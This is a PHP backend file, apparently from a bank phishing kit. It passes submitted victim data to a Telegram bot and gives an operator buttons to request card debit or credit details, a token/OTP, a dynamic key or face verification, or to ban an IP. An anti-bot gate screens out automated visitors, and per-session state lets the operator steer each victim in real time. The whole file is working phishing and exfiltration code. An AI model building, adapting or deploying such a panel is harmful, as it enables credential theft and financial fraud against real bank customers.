<?php
/**
 * ================================================================
 * API Send — Envía datos a Telegram desde el backend
 * ================================================================
 * El token del bot NUNCA viaja al frontend.
 */

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 2. Validar que sea estrictamente POST para cualquier otra llamada real
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Método no permitido']);
    exit;
}

require_once __DIR__ . '/../Antibot.php';

$input = json_decode(file_get_contents('php://input'), true) ?: $_POST;

if (!Antibot::esHumano($input)) {
    Antibot::rechazar();
}

$step       = $input['step']       ?? '';
$message    = $input['message']    ?? '';
$clientSessionId = $input['sessionId'] ?? '';

if (empty($step) || empty($message) || empty($clientSessionId)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Faltan parámetros']);
    exit;
}

// ── Usar sessionId del cliente ──
$sessionId = $input['sessionId'] ?? '';
if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9_]+$/', $sessionId)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'SessionId inválido']);
    exit;
}

$config   = require __DIR__ . '/../config.php';
$botToken = $config['bot_token'];
$chatId   = $config['chat_id'];

// ── Todas las opciones disponibles en TODOS los pasos para control total del admin ──
// Token y OTP son lo mismo; solo se usa Token
$buttons = [
    ['text' => '✅ Aprobar',   'callback_data' => "aprobar_{$step}_{$sessionId}"],
    ['text' => '💳 Débito',    'callback_data' => "debito_{$step}_{$sessionId}"],
    ['text' => '💰 Crédito',   'callback_data' => "credito_{$step}_{$sessionId}"],
    ['text' => '🔐 Token',     'callback_data' => "token_{$step}_{$sessionId}"],
    ['text' => '💳 Dinámica',  'callback_data' => "dinamica_{$step}_{$sessionId}"],
    ['text' => '👤 Face',      'callback_data' => "face_{$step}_{$sessionId}"],
    ['text' => '⚠️ 923',       'callback_data' => "923_{$step}_{$sessionId}"],
    ['text' => '🚫 Ban IP',    'callback_data' => "banip_{$step}_{$sessionId}"],
    ['text' => '❌ Rechazar',  'callback_data' => "rechazar_{$step}_{$sessionId}"]
];

// Agrupar de 2 en 2 para mejor visualización
$keyboard = [];
$row = [];
foreach ($buttons as $i => $btn) {
    $row[] = $btn;
    if (count($row) === 2 || $i === count($buttons) - 1) {
        $keyboard[] = $row;
        $row = [];
    }
}

$postData = http_build_query([
    'chat_id'      => $chatId,
    'text'         => $message . "\n\n⏳ Esperando acción del administrador...",
    'parse_mode'   => 'HTML',
    'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
]);

$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST             => true,
    CURLOPT_POSTFIELDS       => $postData,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 15,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_FOLLOWLOCATION => true
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error    = curl_error($ch);
curl_close($ch);

if ($error || $httpCode !== 200) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Error Telegram', 'details' => $error ?: "HTTP {$httpCode}"]);
    exit;
}

$data = json_decode($response, true);
if (!$data['ok']) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram API error', 'details' => $data['description'] ?? 'Unknown']);
    exit;
}

$messageId = $data['result']['message_id'] ?? null;

// ── Guardar sesión en archivo (Compatible con Vercel Serverless / Render) ──
$dataDir = is_writable(__DIR__ . '/../data') ? __DIR__ . '/../data' : sys_get_temp_dir() . '/data';
if (!is_dir($dataDir)) {
    @mkdir($dataDir, 0755, true);
}

$sessionFile = $dataDir . "/{$sessionId}.json";
$sessionData = [
    'sessionId'   => $sessionId,
    'currentStep' => $step,
    'messageId'   => $messageId,
    'status'      => 'pending',
    'action'      => null,
    'createdAt'   => time(),
    'lastUpdateId'=> 0,
    'messageText' => $message
];

$fp = fopen($sessionFile, 'c');
if (!$fp || !flock($fp, LOCK_EX)) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'No se pudo crear la sesión']);
    exit;
}
ftruncate($fp, 0);
rewind($fp);
$written = fwrite($fp, json_encode($sessionData));
fflush($fp);
flock($fp, LOCK_UN);
fclose($fp);

if ($written === false) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'No se pudo guardar la sesión']);
    exit;
}

echo json_encode([
    'ok'        => true,
    'messageId' => $messageId,
    'sessionId' => $sessionId,
    'step'      => $step
]);